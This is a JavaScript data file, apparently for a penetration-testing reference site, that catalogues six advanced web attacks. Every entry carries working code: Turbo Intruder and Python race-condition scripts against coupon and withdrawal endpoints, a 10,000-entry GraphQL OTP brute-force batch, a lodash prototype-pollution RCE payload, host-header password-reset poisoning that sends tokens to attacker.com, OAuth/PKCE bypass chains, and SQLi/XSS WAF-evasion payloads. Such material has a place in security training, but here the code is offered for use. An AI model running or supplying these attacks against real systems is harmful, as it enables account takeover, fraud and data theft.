export const webAdvancedTechniques = [
  {
    id: 'web-race-conditions-advanced',
    title: 'Race Conditions — Turbo Intruder & Limit-One Overrides',
    subtitle: 'Exploit single-use limits, balances, and state via precisely timed concurrent requests',
    tags: ['race condition', 'Turbo Intruder', 'concurrent requests', 'TOCTOU', 'limit-one bypass', 'HTTP/2 single-packet'],
    accentColor: 'red',
    overview: 'Modern race condition exploitation uses HTTP/2 single-packet attacks to send concurrent requests within a nanosecond window, defeating time-based mitigations that were effective against HTTP/1.1. Burp Turbo Intruder implements this with a gate mechanism. Targets include: single-use coupon codes, one-time password validation, balance checks before deduction, account registration uniqueness checks, and any "check then act" pattern without database-level locking.',
    steps: [
      'Identify the target: any single-use action, balance check, or uniqueness constraint is a candidate',
      'HTTP/2 single-packet attack: send all requests in a single TCP packet — server processes them simultaneously before any response is sent',
      'Turbo Intruder gate(): prepare all requests then release them simultaneously via HTTP/2 or last-byte technique on HTTP/1.1',
      'Connection warming: send a pre-flight request on each connection to eliminate jitter from connection setup latency',
      'Multi-endpoint race: sometimes step 1 and step 2 are different endpoints — align them to fire simultaneously',
      'Confirm success: check account balance, coupon usage count, or duplicate records to confirm race exploitation',
    ],
    commands: [
      {
        title: 'Turbo Intruder — HTTP/2 single-packet race',
        code: `# Burp Suite Turbo Intruder script for single-packet race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

# Burp Repeater HTTP/2 single packet (no script):
# 1. Add multiple tabs for same request
# 2. Select all tabs → right click → "Send group (parallel)"
# 3. Burp uses HTTP/2 to fire all within one packet window`
      },
      {
        title: 'Python concurrent race test',
        code: `import requests, threading

TARGET = "https://target.com/api/redeem"
SESSION = "YOUR_SESSION_COOKIE"
PAYLOAD = {"code": "SAVE50"}

def fire():
    r = requests.post(TARGET, json=PAYLOAD, cookies={"session": SESSION})
    print(r.status_code, r.json())

# Fire 20 threads simultaneously
threads = [threading.Thread(target=fire) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]

# Common race targets:
# POST /api/redeem-coupon       — single-use codes
# POST /api/withdraw            — balance TOCTOU
# POST /api/register            — uniqueness check race
# POST /api/mfa/verify          — OTP brute via window`
      }
    ]
  },
  {
    id: 'web-graphql-attacks',
    title: 'GraphQL — Introspection, Batching & Authorization Bypass',
    subtitle: 'Enumerate schema via introspection, batch mutation attacks, and exploit field-level access control gaps',
    tags: ['GraphQL', 'introspection', 'batching', 'IDOR GraphQL', 'InQL', 'schema traversal', 'mutation abuse'],
    accentColor: 'red',
    overview: 'GraphQL replaces REST with a flexible query language — but this flexibility creates unique security challenges. Introspection reveals the complete API schema. Batching allows sending hundreds of queries in one request, bypassing per-request rate limits. Field-level authorization is often missing — querying admin fields via regular user tokens frequently succeeds. Mutation batching enables single-request brute force attacks on OTP and password fields.',
    steps: [
      'Run introspection query — even if disabled, try field suggestion errors for enumeration',
      'Import introspection output into InQL (Burp extension) or graphql-voyager for visual mapping',
      'Test every query and mutation with a low-privilege user token — missing field-level authorization is extremely common',
      'Batch OTP/password mutations: send 1000 password guesses in a single GraphQL batched request',
      'IDOR via GraphQL: change user ID in node queries — test whether user A can access user B data',
      'Check if mutations accept extra fields not in the schema — mass assignment via undocumented mutations',
    ],
    commands: [
      {
        title: 'GraphQL enumeration',
        code: `# Full introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name,kind},args{name}}}}}"}'

# Introspection disabled — field suggestion trick
curl -X POST https://target.com/graphql \
  -d '{"query":"{us{id}}"}'
# Response: "Did you mean 'user', 'users', 'userById'?"

# Clairvoyance — schema inference without introspection
python3 -m clairvoyance -w graphql-wordlist.txt -o schema.json https://target.com/graphql

# Field-level authz bypass (query admin fields with user token)
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{users{id email role adminNotes passwordHash}}"}'

# IDOR via node query
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{user(id:2){email creditCard address}}"}'`
      },
      {
        title: 'GraphQL batching — OTP brute force',
        code: `# Python — generate 10000-entry batched OTP mutation
import json, requests

mutations = [
    {"query": f'mutation{{verifyOTP(code:"{str(i).zfill(4)}") {{success token}}}}'}
    for i in range(10000)
]
r = requests.post(
    "https://target.com/graphql",
    json=mutations,
    headers={"Content-Type": "application/json", "Cookie": "session=..."}
)
for i, resp in enumerate(r.json()):
    if resp.get("data", {}).get("verifyOTP", {}).get("success"):
        print(f"OTP: {str(i).zfill(4)}")`
      }
    ]
  },
  {
    id: 'web-prototype-pollution',
    title: 'Prototype Pollution — Client-Side & Server-Side',
    subtitle: 'Inject properties into Object.prototype to manipulate app logic, bypass auth, and achieve RCE via lodash',
    tags: ['prototype pollution', '__proto__', 'constructor.prototype', 'lodash', 'Node.js RCE', 'client-side PP', 'JSON injection'],
    accentColor: 'red',
    overview: 'Prototype pollution injects properties into JavaScript Object.prototype, affecting every object created after the injection. Client-side PP manipulates DOM logic and bypasses client-side auth checks. Server-side PP in Node.js (especially via lodash merge/set) can escalate to RCE by poisoning properties like __proto__.env. CVE-2019-10744 lodash vulnerability is still widespread in production.',
    steps: [
      'Client-side detection: inject ?__proto__[test]=1 in URL — check if ({}).test === "1" in console',
      'Server-side detection: inject "__proto__":{} or "constructor":{"prototype":{}} in JSON request bodies',
      'Identify gadgets: look for code reading object properties without hasOwnProperty checks',
      'Auth bypass: if app checks obj.isAdmin — pollute __proto__.isAdmin = true to affect all objects',
      'Node.js RCE via lodash: CVE-2019-10744 — lodash.merge with user input can set __proto__.env',
      'Child process gadgets: some server-side gadgets reach child_process.spawn for full RCE',
    ],
    commands: [
      {
        title: 'Prototype pollution detection and exploitation',
        code: `# Client-side detection
https://target.com/?__proto__[test]=polluted
# Browser console: ({}).test === "polluted" → vulnerable

# Server-side JSON injection
curl -X POST https://target.com/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"test":"polluted"}}'

# Alternative syntax (filter bypass)
{"constructor":{"prototype":{"isAdmin":true}}}

# Auth bypass — pollute isAdmin
curl -X POST https://target.com/api/profile \
  -d '{"__proto__":{"isAdmin":true}}'

# Node.js RCE via lodash CVE-2019-10744
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0"
    }
  }'

# PPScan automated detection
ppmap -l https://target.com/`
      }
    ]
  },
  {
    id: 'web-host-header-attacks',
    title: 'Host Header Injection — Password Reset, Cache & SSRF',
    subtitle: 'Exploit trust in the Host header for account takeover, cache poisoning, and internal service discovery',
    tags: ['Host header injection', 'password reset poisoning', 'cache poisoning', 'X-Forwarded-Host', 'SSRF via host', 'virtual host routing'],
    accentColor: 'red',
    overview: 'Many web frameworks trust the Host header to construct self-referencing URLs — password reset links, OAuth callbacks, and CDN cache keys. An attacker-controlled Host value allows stealing password reset tokens, poisoning cache entries, or routing requests to internal services. WAFs rarely inspect the Host header, making this a reliable low-noise technique.',
    steps: [
      'Password reset poisoning: trigger a reset with Host: attacker.com — the reset link in the email references attacker.com, delivering the token',
      'X-Forwarded-Host injection: some frameworks prefer this header over Host — inject to override URL generation',
      'Cache key bypass: if Host is part of the cache key, use different values to get uncached responses',
      'Routing confusion: inject internal hostnames to reach internal services via load balancer routing',
      'Confirm reset token delivery: set up a listener on attacker.com and trigger the password reset',
    ],
    commands: [
      {
        title: 'Host header attack techniques',
        code: `# Password reset token theft
curl -X POST https://target.com/account/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@corp.com"
# Email contains: http://attacker.com/reset?token=SECRETTOKEN

# X-Forwarded-Host variant
curl -X POST https://target.com/account/forgot-password \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@corp.com"

# Cache poisoning via Host header
curl -s "https://target.com/" -H "X-Forwarded-Host: attacker.com" | grep "attacker.com"
# If reflected in script src: cache it, then fetch without header to confirm

# Internal service routing
curl https://target.com/api/endpoint -H "Host: internal-admin:8080"
curl https://target.com/ -H "Host: admin.internal.corp.local"

# Use stolen token
curl "https://target.com/reset?token=SECRETTOKEN" \
  -X POST -d "password=hacked123"`
      }
    ]
  },
  {
    id: 'web-oauth-advanced',
    title: 'OAuth 2.0 Advanced — Token Leakage & PKCE Bypass',
    subtitle: 'Steal authorization codes via referrer, bypass PKCE, and exploit implicit flow token exposure',
    tags: ['OAuth', 'PKCE bypass', 'authorization code interception', 'referrer leakage', 'implicit flow', 'open redirect chain', 'token theft'],
    accentColor: 'red',
    overview: 'Advanced OAuth attacks target authorization code leakage via Referer headers, PKCE implementation flaws, and implicit flow token exposure in browser history. Combining an open redirect on the authorization server with a crafted redirect_uri allows stealing codes from legitimate flows. PKCE was designed to prevent code interception but broken implementations render it ineffective.',
    steps: [
      'Code via Referer: if the callback page includes third-party resources, the authorization code in the URL leaks via Referer',
      'Open redirect in OAuth: if the IdP has an open redirect, chain it as redirect_uri to steal codes',
      'PKCE plain method: if code_challenge_method=plain is accepted, the verifier equals the challenge — trivially bypassable',
      'PKCE not enforced: try omitting code_challenge entirely — if auth proceeds, PKCE is optional and useless',
      'State CSRF: missing or predictable state parameter allows CSRF during OAuth flow',
      'Implicit flow token in URL fragment: SPA apps expose access tokens in URL — visible in history, analytics, and JS',
    ],
    commands: [
      {
        title: 'Advanced OAuth exploitation',
        code: `# PKCE bypass — omit code_challenge entirely
GET /authorize?
  client_id=CLIENT&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid
# If code returned without challenge: PKCE not enforced

# PKCE plain method bypass
import base64, os
verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
# Send: code_challenge=<verifier>&code_challenge_method=plain
# Exchange: code_verifier=<verifier>  (same value — trivially known)

# Open redirect chain
# IdP has: https://accounts.idp.com/logout?next=https://attacker.com
# Use as redirect_uri:
https://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://accounts.idp.com/logout?next=https://attacker.com&response_type=code

# Referrer leakage test
# If callback page loads: <img src="https://analytics.com/pixel.gif">
# The browser sends: Referer: https://target.com/callback?code=AUTHCODE
# Check analytics/tracker logs for leaked auth codes`
      }
    ]
  },
  {
    id: 'web-waf-bypass',
    title: 'WAF Bypass — Encoding, Chunking & Parser Confusion',
    subtitle: 'Evade Web Application Firewalls using encoding chains, HTTP request mutation, and parser inconsistencies',
    tags: ['WAF bypass', 'encoding', 'chunked encoding', 'content-type confusion', 'unicode normalization', 'HTTP parameter pollution'],
    accentColor: 'red',
    overview: 'WAFs inspect HTTP requests using pattern matching and signatures. They can be bypassed by exploiting differences between what the WAF sees and what the backend processes. Double URL encoding, Unicode normalization, unusual Content-Type values, and chunked transfer encoding exploit parser differences. HTTP parameter pollution exploits how backends parse multi-value parameters.',
    steps: [
      'Identify WAF vendor from response headers/body — Cloudflare, Imperva, F5, Akamai each have signatures',
      'Case variation first: SELECT vs sElEcT, script vs ScRiPt — simple but often effective',
      'Double URL encoding: %3C → %253C — WAF decodes once, backend decodes twice',
      'Chunked encoding: split payloads across chunks — some WAFs do not reassemble chunked bodies before inspection',
      'Content-Type confusion: send JSON payload with Content-Type: text/plain — WAF skips JSON inspection, backend still parses',
      'HTTP parameter pollution: duplicate parameters — WAFs inspect first, backends may use last (or vice versa)',
    ],
    commands: [
      {
        title: 'WAF detection and bypass techniques',
        code: `# WAF detection
wafw00f https://target.com
curl -I https://target.com | grep -iE "x-sucuri|cf-ray|x-firewall|x-cdn"

# Case variation (SQLi)
' UnIoN sElEcT 1,2,3 --
'/**/UNION/**/SELECT/**/1,2,3--

# Double URL encoding
# < = %3C → %253C,  > = %3E → %253E
curl "https://target.com/search?q=%253Cscript%253Ealert(1)%253C%2Fscript%253E"

# Whitespace substitution
'%09UNION%09SELECT%09 1,2,3--   # Tab instead of space
'+UNION+SELECT+1,2,3--

# Chunked body bypass (split payload across chunks)
POST /api/data HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

4
cmd=
6
whoam
1
i
0


# Content-Type confusion
curl -X POST https://target.com/api/login \
  -H "Content-Type: text/plain" \
  -d '{"username":"admin","password":"OR 1=1--"}'

# HTTP parameter pollution
curl "https://target.com/api?user=normal&user=admin"
curl "https://target.com/api" -d "role=user&role=admin"`
      }
    ]
  },
];